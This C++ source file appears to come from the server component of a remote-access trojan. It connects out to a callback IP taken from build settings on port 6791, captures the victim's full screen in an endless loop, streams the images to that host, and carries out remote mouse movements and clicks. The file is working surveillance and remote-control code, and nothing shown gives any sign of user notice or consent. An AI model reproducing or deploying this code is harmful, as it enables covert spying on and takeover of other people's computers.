#include "StdAfx.h"
#include "ServScreen.h"
#include "ServSock.h"
#include "ServFileSock.h"
#include <atlimage.h>


#define WM_ENDTHREAD (WM_USER+200)

CServScreen::CServScreen(void)
{
	AllSock = NULL;
	threadID = NULL;
}

CServScreen::~CServScreen(void)
{
}

void CServScreen::ScreenCommand(COMMEND cmd, SOCKET sk)
{
	AllSock = sk;
	switch(cmd.fID)
	{
	case STARTSCREEEN:
		CloseHandle(CreateThread(NULL, 0, MyDcFunc, this, NULL, &threadID));
		break;
	case STARTSENDPIC:
		PostThreadMessage(threadID, WM_ENDTHREAD, 0, 0);
		break;
	case WM_LBUTTONDOWN:
		MyMouse(cmd, WM_LBUTTONDOWN);
		break;
	case WM_RBUTTONDOWN:
		MyMouse(cmd, WM_RBUTTONDOWN);
		break;
	case WM_LBUTTONDBLCLK:
		MyMouse(cmd, WM_LBUTTONDBLCLK);
		break;
	default:
		break;
	}
}

DWORD WINAPI CServScreen::MyDcFunc(LPVOID lp)
{
	CServScreen *pthis = (CServScreen*)lp;

	BUILD MyBuild = pthis->m_ServSock->MyGetBuildInfo();
	char aIP[40] = {0};
	WideCharToMultiByte(CP_ACP, 0, MyBuild.IP, 40, aIP, 40, NULL, NULL);

	//MessageBoxA(NULL, aIP, "1", NULL);

	SOCKET fSock = pthis->m_ServSock->MyConnect(aIP, 6791);
	if (!pthis->m_ServFileSock->MySendFile(fSock, STARTSCREEEN, NULL, 0, 0))
	{
		return 0;
	}
	while(1)
	{
		int wigth = GetSystemMetrics(SM_CXSCREEN);
		int hight = GetSystemMetrics(SM_CYSCREEN);
		HDC memDC, pDC;
		pDC = GetDC(GetDesktopWindow());
		memDC = CreateCompatibleDC(pDC);
		HBITMAP hBit;
		hBit = CreateCompatibleBitmap(pDC, wigth, hight);
		SelectObject(memDC, hBit);
		BitBlt(memDC, 0, 0, wigth, hight, pDC, 0, 0, SRCCOPY);

		wchar_t jpgtemp[MAX_PATH] = {0};
		GetTempPath(MAX_PATH, jpgtemp);
		lstrcatW(jpgtemp, _T("1.jpg"));
		CImage m_image;
		m_image.Attach(hBit);
		m_image.Save(jpgtemp);
		ReleaseDC(GetDesktopWindow(), pDC);
		DeleteDC(memDC);

		HANDLE hPic = CreateFile(jpgtemp, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
		if (hPic == INVALID_HANDLE_VALUE || !pthis->m_ServFileSock->MySendFile(fSock, FILECREATE, NULL, 0, 0))
		{
			return 0;
		}
		char *buf = new char[FILESIZE];
		while(1)
		{
			DWORD dr = 0;
			ZeroMemory(buf, FILESIZE);
			ReadFile(hPic, buf, FILESIZE, &dr, NULL);
			if (!pthis->m_ServFileSock->MySendFile(fSock, STARTSCREEEN, buf, dr, dr))
			{
				CloseHandle(hPic);
				DeleteFile(jpgtemp);
				delete[] buf;
				return 0;
			}
			if (dr < FILESIZE)
			{
				CloseHandle(hPic);
				DeleteFile(jpgtemp);
				delete[] buf;
				break;
			}
			Sleep(30);
		}
		Sleep(30);
	}
	return 0;
}
void CServScreen::MyMouse(COMMEND cmd, DWORD dr)
{
	POINT pt;
	memcpy(&pt, cmd.teste, sizeof(POINT));
	SetCursorPos(pt.x, pt.y);
	switch(dr)
	{
	case WM_LBUTTONDOWN:
		mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		break;
	case WM_LBUTTONDBLCLK:
		mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		break;
	case WM_RBUTTONDOWN:
		mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
		break;
	default:
		break;
	}
}
